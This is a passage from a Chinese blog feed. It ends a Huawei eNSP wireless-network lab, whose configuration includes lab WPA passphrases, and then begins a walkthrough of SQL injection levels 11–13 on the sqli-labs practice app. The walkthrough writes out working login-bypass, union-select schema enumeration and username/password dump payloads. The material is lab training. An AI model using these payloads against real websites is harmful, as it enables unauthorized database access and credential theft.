0.0.0.255</span><br></pre></td></tr></table></figure><h2 id="3、配置交换机LSW2"><a href="#3、配置交换机LSW2" class="headerlink" title="3、配置交换机LSW2"></a>3、配置交换机LSW2</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">进入系统视图</span><br><span class="line"><span class="tag">&lt;<span class="name">Huawei</span>&gt;</span>sys</span><br><span class="line">改名字</span><br><span class="line">[Huawei]sys LSW2</span><br><span class="line">关闭提示</span><br><span class="line">[LSW2]undo info enable</span><br><span class="line">创建vlan50到52</span><br><span class="line">[LSW2]vlan batch 50 to 52</span><br><span class="line">进入接口e 0/0/2</span><br><span class="line">配置trunk和允许通过的vlan</span><br><span class="line">[LSW2]inter e0/0/2</span><br><span class="line">[LSW2-Ethernet0/0/2]port link-type trunk </span><br><span class="line">[LSW2-Ethernet0/0/2]port trunk allow-pass vlan 50 to 52</span><br><span class="line">[LSW2-Ethernet0/0/2]port trunk pvid vlan 50</span><br><span class="line">进入接口e 0/0/1</span><br><span class="line">配置trunk和允许通过的vlan</span><br><span class="line">[LSW2]inter e 0/0/1</span><br><span class="line">[LSW2-Ethernet0/0/1]port link-type trunk </span><br><span class="line">[LSW2-Ethernet0/0/1]port trunk allow-pass vlan 50 to 52</span><br></pre></td></tr></table></figure><h2 id="4、配置交换机LSW3"><a href="#4、配置交换机LSW3" class="headerlink" title="4、配置交换机LSW3"></a>4、配置交换机LSW3</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">进入系统视图</span><br><span class="line"><span class="tag">&lt;<span class="name">Huawei</span>&gt;</span>sys</span><br><span class="line">关闭提示</span><br><span class="line">[Huawei]undo info enable</span><br><span class="line">改名字</span><br><span class="line">[Huawei]sys LSW3</span><br><span class="line">创建vlan50到52</span><br><span class="line">[LSW3]vlan batch 50 to 52</span><br><span class="line">进入接口e 0/0/2</span><br><span class="line">配置trunk和允许通过的vlan</span><br><span class="line">[LSW3]inter e 0/0/2</span><br><span class="line">[LSW3-Ethernet0/0/2]port link-type trunk </span><br><span class="line">[LSW3-Ethernet0/0/2]port trunk allow-pass vlan 50 to 54</span><br><span class="line">[LSW3-Ethernet0/0/2]port trunk pvid vlan 50</span><br><span class="line">进入接口e 0/0/1</span><br><span class="line">配置trunk和允许通过的vlan</span><br><span class="line">[LSW3-Ethernet0/0/2]inter e 0/0/1</span><br><span class="line">[LSW3-Ethernet0/0/1]port link-type trunk </span><br><span class="line">[LSW3-Ethernet0/0/1]port trunk allow-pass vlan 50 to 54</span><br><span class="line">[LSW3-Ethernet0/0/1]q</span><br></pre></td></tr></table></figure><h2 id="5、配置交换机LSW4"><a href="#5、配置交换机LSW4" class="headerlink" title="5、配置交换机LSW4"></a>5、配置交换机LSW4</h2><p>无配置</p><h2 id="6、配置路由器AR1"><a href="#6、配置路由器AR1" class="headerlink" title="6、配置路由器AR1"></a>6、配置路由器AR1</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">进入系统视图</span><br><span class="line"><span class="tag">&lt;<span class="name">Huawei</span>&gt;</span>sys</span><br><span class="line">关闭提示</span><br><span class="line">[Huawei]undo info enable</span><br><span class="line">改名字</span><br><span class="line">[Huawei]sys AR1</span><br><span class="line">进入g 0/0/0端口，配置网关</span><br><span class="line">[AR1]inter g 0/0/0</span><br><span class="line">[AR1-GigabitEthernet0/0/0]ip add 10.10.29.1 24</span><br><span class="line">[AR1]inter g0/0/1</span><br><span class="line">进入g 0/0/1端口，配置网关</span><br><span class="line">[AR1-GigabitEthernet0/0/1]ip add 10.10.28.2 24</span><br><span class="line">[AR1-GigabitEthernet0/0/1]q</span><br><span class="line">配置ospf</span><br><span class="line">[AR1]ospf</span><br><span class="line">[AR1-ospf-1]area 0</span><br><span class="line">[AR1-ospf-1-area-0.0.0.0]network 10.10.28.0 0.0.0.255</span><br><span class="line">[AR1-ospf-1-area-0.0.0.0]network 10.10.29.0 0.0.0.255</span><br></pre></td></tr></table></figure><h2 id="7、配置路由器AR2"><a href="#7、配置路由器AR2" class="headerlink" title="7、配置路由器AR2"></a>7、配置路由器AR2</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">进入系统视图</span><br><span class="line"><span class="tag">&lt;<span class="name">Huawei</span>&gt;</span>sys</span><br><span class="line">关闭提示</span><br><span class="line">[Huawei]undo info enable</span><br><span class="line">改名字</span><br><span class="line">[Huawei]sys AR2</span><br><span class="line">进入g 0/0/0端口，配置网关</span><br><span class="line">[AR2]inter g 0/0/0</span><br><span class="line">[AR2-GigabitEthernet0/0/0]ip add 10.10.29.2 24</span><br><span class="line">进入g 0/0/1端口，配置网关</span><br><span class="line">[AR2-GigabitEthernet0/0/0]inter g 0/0/1</span><br><span class="line">[AR2-GigabitEthernet0/0/1]ip add 10.10.30.1 24</span><br><span class="line">[AR2-GigabitEthernet0/0/1]q</span><br><span class="line">配置ospf</span><br><span class="line">[AR2]ospf</span><br><span class="line">[AR2-ospf-1]area 0</span><br><span class="line">[AR2-ospf-1-area-0.0.0.0]network 10.10.29.0 0.0.0.255</span><br><span class="line">[AR2-ospf-1-area-0.0.0.0]network 10.10.30.0 0.0.0.255</span><br></pre></td></tr></table></figure><h2 id="8、配置-AC-基础信息"><a href="#8、配置-AC-基础信息" class="headerlink" title="8、配置 AC 基础信息"></a>8、配置 AC 基础信息</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">创建vlan50到52</span><br><span class="line">[ACL]vlan batch 50 to 52</span><br><span class="line">进入g 0/0/0 </span><br><span class="line">配置trunk和允许通过vlan</span><br><span class="line">[ACL]inter g 0/0/1</span><br><span class="line">[ACL-GigabitEthernet0/0/1]port link-type trunk </span><br><span class="line">[ACL-GigabitEthernet0/0/1]port trunk  allow-pass vlan 50 to 52</span><br><span class="line">[ACL-GigabitEthernet0/0/1]inter vlan50</span><br><span class="line">配置vlanif地址</span><br><span class="line">[ACL-Vlanif50]ip add 10.10.25.2 24</span><br><span class="line">[ACL-Vlanif50]inter vlan 51</span><br><span class="line">[ACL-Vlanif51]ip add 10.10.26.2 24</span><br><span class="line">[ACL-Vlanif51]inter vlan 52</span><br><span class="line">[ACL-Vlanif52]ip add 10.10.27.2 24</span><br><span class="line">[ACL-Vlanif52]q</span><br></pre></td></tr></table></figure><h2 id="9、创建-AP-组"><a href="#9、创建-AP-组" class="headerlink" title="9、创建 AP 组"></a>9、创建 AP 组</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]ap-group name ap-group1</span><br></pre></td></tr></table></figure><h2 id="10、配置AC的DHCP"><a href="#10、配置AC的DHCP" class="headerlink" title="10、配置AC的DHCP"></a>10、配置AC的DHCP</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">开启dhcp</span><br><span class="line">[ACL]dhcp enable</span><br><span class="line">创建地址池ap</span><br><span class="line">[ACL]ip pool ap</span><br><span class="line">[ACL-ip-pool-ap]network 10.10.25.0 mask 24</span><br><span class="line">[ACL-ip-pool-ap]gateway-list 10.10.25.1</span><br><span class="line">[ACL-ip-pool-ap]q</span><br><span class="line">创建地址池ycu</span><br><span class="line">[ACL]ip pool ycu</span><br><span class="line">[ACL-ip-pool-ycu]network 10.10.26.0 mask 24</span><br><span class="line">[ACL-ip-pool-ycu]gateway-list 10.10.26.1</span><br><span class="line">[ACL-ip-pool-ycu]q</span><br><span class="line">创建地址池guest</span><br><span class="line">[ACL]ip pool guest</span><br><span class="line">[ACL-ip-pool-guest]network 10.10.27.0 mask 24</span><br><span class="line">[ACL-ip-pool-guest]gateway-list 10.10.27.1</span><br><span class="line">[ACL-ip-pool-guest]q</span><br><span class="line">进入vlanif，开启dhcp</span><br><span class="line">[ACL]inter vlan50</span><br><span class="line">[ACL-Vlanif50]dhcp select global </span><br><span class="line">[ACL-Vlanif50]inter vlan51</span><br><span class="line">[ACL-Vlanif51]dhcp select global</span><br><span class="line">[ACL-Vlanif51]inter vlan 52</span><br><span class="line">[ACL-Vlanif52]dhcp select global</span><br></pre></td></tr></table></figure><h2 id="11、配置AC-domain管理模板"><a href="#11、配置AC-domain管理模板" class="headerlink" title="11、配置AC domain管理模板"></a>11、配置AC domain管理模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ACL]wlan</span><br><span class="line">[ACL-wlan-view]regulatory-domain-profile name domain1</span><br><span class="line">[ACL-wlan-regulate-domain-domain1]country-code CN </span><br></pre></td></tr></table></figure><h2 id="12、配置AC源接口"><a href="#12、配置AC源接口" class="headerlink" title="12、配置AC源接口"></a>12、配置AC源接口</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[ACL]capwap source interface Vlanif 50</span><br></pre></td></tr></table></figure><h2 id="13、配置AC-ap的mac认证"><a href="#13、配置AC-ap的mac认证" class="headerlink" title="13、配置AC ap的mac认证"></a>13、配置AC ap的mac认证</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[ACL]wlan</span><br><span class="line">[ACL-wlan-view]ap auth-mode mac-auth </span><br><span class="line">配置ap的mac地址认证，命名ap-id</span><br><span class="line">[ACL-wlan-view]ap-mac 00E0-FC11-33A0 ap-id 1</span><br><span class="line">分组到ap-group1</span><br><span class="line">[ACL-wlan-ap-1]ap-group ap-group1</span><br><span class="line">命名ap1</span><br><span class="line">[ACL-wlan-ap-1]ap-name ap1</span><br><span class="line">[ACL-wlan-ap-1]q</span><br><span class="line">配置ap的mac地址认证，命名ap-id</span><br><span class="line">[ACL-wlan-view]ap-mac 00E0-FC41-3ED0 ap-id 2</span><br><span class="line">分组到ap-group1</span><br><span class="line">[ACL-wlan-ap-2]ap-group ap-group1</span><br><span class="line">命名ap1</span><br><span class="line">[ACL-wlan-ap-2]ap-name ap2</span><br><span class="line">[ACL-wlan-ap-2]q</span><br></pre></td></tr></table></figure><h2 id="14、创建AC的ssid模板"><a href="#14、创建AC的ssid模板" class="headerlink" title="14、创建AC的ssid模板"></a>14、创建AC的ssid模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]ssid-profile name ycu</span><br><span class="line">[ACL-wlan-ssid-prof-ycu]ssid ycu</span><br><span class="line">[ACL-wlan-ssid-prof-ycu]q</span><br><span class="line">[ACL-wlan-view]ssid-profile name guest</span><br><span class="line">[ACL-wlan-ssid-prof-guest]ssid guest</span><br><span class="line">[ACL-wlan-ssid-prof-guest]q</span><br></pre></td></tr></table></figure><h2 id="15、创建AC的vap模板"><a href="#15、创建AC的vap模板" class="headerlink" title="15、创建AC的vap模板"></a>15、创建AC的vap模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]vap-profile name ycu</span><br><span class="line">配置ycu为直接转发</span><br><span class="line">[ACL-wlan-vap-prof-ycu]forward-mode direct-forward </span><br><span class="line">[ACL-wlan-vap-prof-ycu]service-vlan vlan-id 51</span><br><span class="line">[ACL-wlan-vap-prof-ycu]ssid-profile ycu</span><br><span class="line">[ACL-wlan-view]vap-profile name guest</span><br><span class="line">配置guest为隧道转发</span><br><span class="line">[ACL-wlan-vap-prof-guest]forward-mode tunnel </span><br><span class="line">[ACL-wlan-vap-prof-guest]service-vlan vlan-id 52</span><br><span class="line">[ACL-wlan-vap-prof-guest]q</span><br><span class="line">[ACL-wlan-view]vap-profile name guest</span><br><span class="line">[ACL-wlan-vap-prof-guest]ssid-profile guest</span><br></pre></td></tr></table></figure><h2 id="16、创建AC安全模板"><a href="#16、创建AC安全模板" class="headerlink" title="16、创建AC安全模板"></a>16、创建AC安全模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]security-profile name ycu</span><br><span class="line">[ACL-wlan-sec-prof-ycu]security wpa psk pass-phrase peiyimiao2021 tkip </span><br><span class="line">[ACL-wlan-sec-prof-ycu]q</span><br><span class="line">[ACL-wlan-view]security-profile name guest</span><br><span class="line">[ACL-wlan-sec-prof-guest]security wpa psk pass-phrase guest2021 tkip</span><br><span class="line">[ACL-wlan-sec-prof-guest]q</span><br></pre></td></tr></table></figure><h2 id="17、将安全模板应用到vap模板上"><a href="#17、将安全模板应用到vap模板上" class="headerlink" title="17、将安全模板应用到vap模板上"></a>17、将安全模板应用到vap模板上</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ACL-wlan-view]vap-profile name ycu</span><br><span class="line">[ACL-wlan-vap-prof-ycu]security-profile ycu</span><br><span class="line">[ACL-wlan-vap-prof-ycu]q</span><br><span class="line">[ACL-wlan-view]vap-profile name guest</span><br><span class="line">[ACL-wlan-vap-prof-guest]security-profile guest</span><br></pre></td></tr></table></figure><h2 id="18、关闭自动调频"><a href="#18、关闭自动调频" class="headerlink" title="18、关闭自动调频"></a>18、关闭自动调频</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]rrm-profile name default</span><br><span class="line">[ACL-wlan-rrm-prof-default]calibrate auto-channel-select disable </span><br><span class="line">[ACL-wlan-rrm-prof-default]calibrate auto-txpower-select disable </span><br></pre></td></tr></table></figure><h2 id="19、手动配置ap频段信道"><a href="#19、手动配置ap频段信道" class="headerlink" title="19、手动配置ap频段信道"></a>19、手动配置ap频段信道</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[ACL]wlan</span><br><span class="line">[ACL-wlan-view]ap-id 1</span><br><span class="line">[ACL-wlan-ap-1]radio 0</span><br><span class="line">[ACL-wlan-radio-1/0]channel 20mhz 1</span><br><span class="line">[ACL-wlan-radio-1/0]radio 1</span><br><span class="line">[ACL-wlan-radio-1/1]channel 20mhz 149 </span><br><span class="line">[ACL-wlan-radio-1/1]q</span><br><span class="line">[ACL-wlan-ap-1]q</span><br><span class="line">[ACL-wlan-view]ap-id 2</span><br><span class="line">[ACL-wlan-ap-2]radio 0</span><br><span class="line">[ACL-wlan-radio-2/0]channel 20mhz 6</span><br><span class="line">[ACL-wlan-radio-2/0]radio 1</span><br><span class="line">[ACL-wlan-radio-2/1]channel 20mhz 36</span><br></pre></td></tr></table></figure><h2 id="20、配置AP组引用域管理模板和vap模板"><a href="#20、配置AP组引用域管理模板和vap模板" class="headerlink" title="20、配置AP组引用域管理模板和vap模板"></a>20、配置AP组引用域管理模板和vap模板</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ACL-wlan-view]ap-group name ap-group1</span><br><span class="line">[ACL-wlan-ap-group-ap-group1]vap-profile ycu wlan 1 radio all</span><br><span class="line">[ACL-wlan-ap-group-ap-group1]vap-profile guest wlan 2 radio all</span><br><span class="line">[ACL-wlan-ap-group-ap-group1]regulatory-domain-profile domain1</span><br></pre></td></tr></table></figure><h2 id="21、开启AC的ospf"><a href="#21、开启AC的ospf" class="headerlink" title="21、开启AC的ospf"></a>21、开启AC的ospf</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[ACL-ospf-1]area 0</span><br><span class="line">[ACL-ospf-1-area-0.0.0.0]network 10.10.25.0 0.0.0.255</span><br><span class="line">[ACL-ospf-1-area-0.0.0.0]network 10.10.26.0 0.0.0.255</span><br><span class="line">[ACL-ospf-1-area-0.0.0.0]network 10.10.27.0 0.0.0.255</span><br></pre></td></tr></table></figure><h1 id="七、结果验证"><a href="#七、结果验证" class="headerlink" title="七、结果验证"></a>七、结果验证</h1><h2 id="1、查看-VAP-状态"><a href="#1、查看-VAP-状态" class="headerlink" title="1、查看 VAP 状态"></a>1、查看 VAP 状态</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/3534e0db87c8441685f79ce7915b1f80.png" alt="在这里插入图片描述"><img src="http://120.48.107.243:9090/blog/2023/04/01/bf0b4046218f4b8db7c5927750fd19b2.png" alt="在这里插入图片描述"></p><h2 id="2、display-station-all"><a href="#2、display-station-all" class="headerlink" title="2、display station all"></a>2、display station all</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/ae6d8d9c421f4817ad3672b2a78c6393.png" alt="在这里插入图片描述"></p><h2 id="3、display-radio-ap-id-1"><a href="#3、display-radio-ap-id-1" class="headerlink" title="3、display radio ap-id 1"></a>3、display radio ap-id 1</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/9676400c4d5e4877acbcd087a48185ea.png" alt="在这里插入图片描述"></p><h2 id="4、display-radio-ap-id-2"><a href="#4、display-radio-ap-id-2" class="headerlink" title="4、display radio ap-id 2"></a>4、display radio ap-id 2</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/40e5fca07bd0445780cd4309a5ac8e90.png" alt="在这里插入图片描述"></p><h2 id="5、dis-ap-all"><a href="#5、dis-ap-all" class="headerlink" title="5、dis ap all"></a>5、dis ap all</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/3ecd0ac2513144f9956e9b1e71f58344.png" alt="在这里插入图片描述"></p><h2 id="6、dis-ip-pool-name-ycu"><a href="#6、dis-ip-pool-name-ycu" class="headerlink" title="6、dis ip pool name ycu"></a>6、dis ip pool name ycu</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/e8f688186e9342cab81c3d633ad2bf41.png" alt="在这里插入图片描述"></p><h2 id="7、dis-ip-pool-name-guest"><a href="#7、dis-ip-pool-name-guest" class="headerlink" title="7、dis ip pool name guest"></a>7、dis ip pool name guest</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/02292bd37c1844debdb6b486362d97b5.png" alt="在这里插入图片描述"></p><h2 id="8、dis-ip-routing-table"><a href="#8、dis-ip-routing-table" class="headerlink" title="8、dis ip routing-table"></a>8、dis ip routing-table</h2><p><img src="http://120.48.107.243:9090/blog/2023/04/01/c68b9d7a9de14925b41aac214125108e.png" alt="在这里插入图片描述"></p><h2 id="9、STA1-ping-PC1"><a href="#9、STA1-ping-PC1" class="headerlink" title="9、STA1 ping PC1"></a>9、STA1 ping PC1</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/7077cbd02b174a418171cfb1b95dc3a3.png" alt="在这里插入图片描述"></p><h3 id="PC1-ping-STA1"><a href="#PC1-ping-STA1" class="headerlink" title="PC1 ping STA1"></a>PC1 ping STA1</h3><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/29b64e6e9cbb41c7b542c3e95adc53fd.png" alt="在这里插入图片描述"></p><h2 id="10、STA2-ping-PC1"><a href="#10、STA2-ping-PC1" class="headerlink" title="10、STA2 ping PC1"></a>10、STA2 ping PC1</h2><p> <img src="http://120.48.107.243:9090/blog/2023/04/01/34f92934d9474ea2b7e5e0f83187d313.png" alt="在这里插入图片描述"></p><h3 id="PC1-ping-STA2"><a href="#PC1-ping-STA2" class="headerlink" title="PC1 ping STA2"></a>PC1 ping STA2</h3><p><img src="http://120.48.107.243:9090/blog/2023/04/01/f0353fa8681c4ae9a814f0554ad6247f.png" alt="在这里插入图片描述"></p><h1 id="八、后记"><a href="#八、后记" class="headerlink" title="八、后记"></a>八、后记</h1><p>这个实验是很久之前做的了，当时肝了好久，也遇到很多问题，请各位看客海涵，有问题建议可以留下宝贵的评论。</p>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
          <category> ensp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
            <tag> ensp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入靶场（三）</title>
      <link href="/2022/08/10/sql_lab_three/"/>
      <url>/2022/08/10/sql_lab_three/</url>
      
        <content type="html"><![CDATA[<h1 id="一、实操环境"><a href="#一、实操环境" class="headerlink" title="一、实操环境"></a>一、实操环境</h1><h2 id="1、操作系统"><a href="#1、操作系统" class="headerlink" title="1、操作系统"></a>1、操作系统</h2><ol><li>VMware虚拟机创建的win10系统</li><li>内存8GB</li><li>硬盘255GB</li><li>处理器AMD Ryzen 9 5900HX</li></ol><h2 id="2、操作项目"><a href="#2、操作项目" class="headerlink" title="2、操作项目"></a>2、操作项目</h2><p><strong>sql-lib项目，本篇文章介绍关卡11-15。</strong></p><h2 id="3、工具版本"><a href="#3、工具版本" class="headerlink" title="3、工具版本"></a>3、工具版本</h2><ol><li><p>phpstudy 8.1.1.3</p></li><li><p>php版本 5.4.45nts</p></li><li><p>Apache2.4.39</p></li><li><p>MySQL5.7.26</p></li><li><p>Chrome</p></li></ol><h2 id="4、SQL注入目的"><a href="#4、SQL注入目的" class="headerlink" title="4、SQL注入目的"></a>4、SQL注入目的</h2><ol><li>判断是否允许注入</li><li>判断注入点类型</li><li>判断回显点</li><li>获取数据库信息</li><li>获取表信息 </li><li>获取字段信息</li></ol><h1 id="二、less-11"><a href="#二、less-11" class="headerlink" title="二、less-11"></a>二、less-11</h1><h2 id="1、注入判断"><a href="#1、注入判断" class="headerlink" title="1、注入判断"></a>1、注入判断</h2><p>post注入，先在username输入admin’，密码随便输，返回错误信息，从错误信息可以找到username有注入点，而且应该是字符注入类型。<br>burp抓到的包是这样的。<br><img src="https://img-blog.csdnimg.cn/7066ffb3dbf046079e4e9cd4da9f8b02.png" alt="在这里插入图片描述"><br>在burp中万能语句，admin’ or 1&#x3D;1 发现正常登录了。<br><img src="https://img-blog.csdnimg.cn/93fafa52043d49538377e8d4ffb6b5bf.png" alt="在这里插入图片描述"><br>记得在F12hackbar中将post开启。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/c82fb6dc7851415ab1de3b9f7153be0d.png" alt="在这里插入图片描述"></p><h2 id="2、确定列数"><a href="#2、确定列数" class="headerlink" title="2、确定列数"></a>2、确定列数</h2><p>使用order by。<br>如果是admin’ or order by 3# 会报错，如果是2，则正常显示，所以列数有两列。</p><h2 id="3、获取数据库名"><a href="#3、获取数据库名" class="headerlink" title="3、获取数据库名"></a>3、获取数据库名</h2><p>输入1（这里随便给个值，目的是让其查不到） admin’ union select 1,database()#可以显示出库名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/1044df763d5b4610bc75a256ed4563ea.png" alt="在这里插入图片描述"></p><h2 id="4、获取表信息"><a href="#4、获取表信息" class="headerlink" title="4、获取表信息"></a>4、获取表信息</h2><p>输入1 admin’ union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#就可以查出表信息。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/22ff4003f0ca4a77a3956b3aaf155b30.png" alt="在这里插入图片描述"></p><h2 id="5、获取列名"><a href="#5、获取列名" class="headerlink" title="5、获取列名"></a>5、获取列名</h2><p>输入1 admin’ union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’#，即可获取列名。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/15cd9a0c389f47e598e86ae5c6a3b2bf.png" alt="在这里插入图片描述"></p><h2 id="6、获取用户名、密码"><a href="#6、获取用户名、密码" class="headerlink" title="6、获取用户名、密码"></a>6、获取用户名、密码</h2><p>输入1 admin’ union select group_concat(username),group_concat(password)from users#即可获取用户名和密码。<br><img src="http://120.48.107.243:9090/blog/2023/04/03/46ae7e80830e4643b05beddd934d2c48.png" alt="在这里插入图片描述"></p><h1 id="三、less-12"><a href="#三、less-12" class="headerlink" title="三、less-12"></a>三、less-12</h1><h2 id="1、尝试判断"><a href="#1、尝试判断" class="headerlink" title="1、尝试判断"></a>1、尝试判断</h2><p>输入admin’，没有回显，有可能是双引号字符型注入，如果输入admin”，报错，所以这里修改为admin”) or 1&#x3D;1#，登陆成功。</p><h2 id="2、获取数据库信息"><a href="#2、获取数据库信息" class="headerlink" title="2、获取数据库信息"></a>2、获取数据库信息</h2><p>1 admin”) union select 1,database()#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/3dbfca7c69b345efa218fc23797d1744.png" alt="在这里插入图片描述"></p><h2 id="3、获取表信息"><a href="#3、获取表信息" class="headerlink" title="3、获取表信息"></a>3、获取表信息</h2><p>输入1 admin”) union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/f3bb298fedc140ab9eb181b164c52469.png" alt="在这里插入图片描述"></p><h2 id="4、获取列信息"><a href="#4、获取列信息" class="headerlink" title="4、获取列信息"></a>4、获取列信息</h2><p>1 admin”) union select 1,group_concat(column_name) from information_schema.columns where table_schema&#x3D;database() and table_name&#x3D;’users’#<br><img src="http://120.48.107.243:9090/blog/2023/04/03/2b0ae36146884a649f3e6503216f34fe.png" alt="在这里插入图片描述"></p><h2 id="5、获取用户名和密码"><a href="#5、获取用户名和密码" class="headerlink" title="5、获取用户名和密码"></a>5、获取用户名和密码</h2><p>1 admin”) union select group_concat(username),group_concat(password)from users#</p><p><img src="http://120.48.107.243:9090/blog/2023/04/03/f7f8cd600c6f45bc960616b47795201b.png" alt="在这里插入图片描述"></p><h1 id="四、less-13"><a href="#四、less-13" class="headerlink" title="四、less-13"></a>四、less-13</h1><h2 id="1、尝试判断注入"><a href="#1、尝试判断注入" class="headerlink" title="1、尝试判断注入"></a>1、尝试判断注入</h2><p>先尝试admin’，报错，看报错信息，修改为admin’) or 1&#x3D;1#，发现没有回显，所以使用报错盲注。</p><h2 id="2、获取数据库信息-1"><a href="#2、获取数据库信息-1" class="headerlink" 